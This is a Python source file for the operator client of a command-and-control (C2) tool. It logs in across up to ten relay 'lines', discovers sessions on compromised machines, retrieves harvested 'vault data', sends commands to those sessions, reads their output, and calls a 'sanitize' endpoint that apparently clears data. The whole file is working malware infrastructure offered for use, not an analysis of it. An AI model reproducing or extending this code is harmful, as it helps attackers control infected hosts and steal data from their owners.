# C2_Client/api_client.py (Full file with enhanced debugging)
import requests
import json
from config import RELAY_URL_FORMAT

class ApiClient:
    def __init__(self, main_window):
        self.main_window = main_window
        self.session = requests.Session()
        self.base_url = None
        self.line_number = None

    def set_line(self, line_number):
        self.line_number = line_number
        self.base_url = RELAY_URL_FORMAT.format(line_number)
        print(f"[API Client] Communication line set to: {self.base_url}")

    def _request(self, method, endpoint, **kwargs):
        # --- PRODUCTION LOGIC ---
        # For auth actions, try each line until a definitive success or failure is found
        if endpoint in ['/auth/login', '/auth/register', '/auth/delete']:
            for i in range(1, 11):
                url = RELAY_URL_FORMAT.format(i) + endpoint
                print(f"[API DEBUG] Attempting {method} request to {url}")
                try:
                    response = self.session.request(method, url, timeout=5, **kwargs)
                    # A response code less than 500 (server error) is a definitive answer
                    if response.status_code < 500:
                        print(f"[API DEBUG] Received definitive response from {url}: {response.status_code}")
                        try:
                            # Try to parse and return JSON
                            return response.json()
                        except json.JSONDecodeError:
                            # If it's not JSON, it's an error (like a 404 HTML page)
                            print(f"[API FATAL] Server returned non-JSON response. Raw text: {response.text}")
                            return {"success": False, "error": f"Server error on line {i}: Not a valid JSON response."}
                except requests.exceptions.RequestException as e:
                    print(f"[API DEBUG] Connection error on line {i}: {e}")
                    continue # Try the next line
            
            # If the loop finishes without a definitive answer, all lines failed to connect
            self.main_window.statusBar().showMessage("API Error: Could not connect to any C2 line.", 5000)
            return None
        
        # For regular C2 traffic to a specific line
        if not self.base_url:
            self.main_window.statusBar().showMessage("API Error: Not logged in.", 5000)
            return None
            
        try:
            url = f"{self.base_url}{endpoint}"
            response = self.session.request(method, url, timeout=15, **kwargs)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            error_message = f"API Error: {e}"
            if e.response is not None:
                try:
                    error_details = e.response.json().get("error", "No details provided.")
                    error_message += f" - {error_details}"
                except: pass
            self.main_window.statusBar().showMessage(error_message, 5000)
            return None

    def register(self, username, password):
        return self._request('POST', '/auth/register', json={'username': username, 'password': password})

    def login(self, username, password):
        return self._request('POST', '/auth/login', json={'username': username, 'password': password})

    def delete_account(self, username):
        return self._request('POST', '/auth/delete', json={'username': username})

    def discover_sessions(self, username):
        return self._request('POST', '/c2/discover', json={'username': username})

    def get_all_vault_data(self, username):
        return self._request('POST', '/c2/get_all_vault_data', json={'username': username})

    def get_responses(self, username, session_id):
        return self._request('POST', '/c2/get_responses', json={'username': username, 'session_id': session_id})

    def send_task(self, username, session_id, command):
        return self._request('POST', '/c2/task', json={'username': username, 'session_id': session_id, 'command': command})

    def sanitize_data(self, username):
        return self._request('POST', '/c2/sanitize', json={'username': username})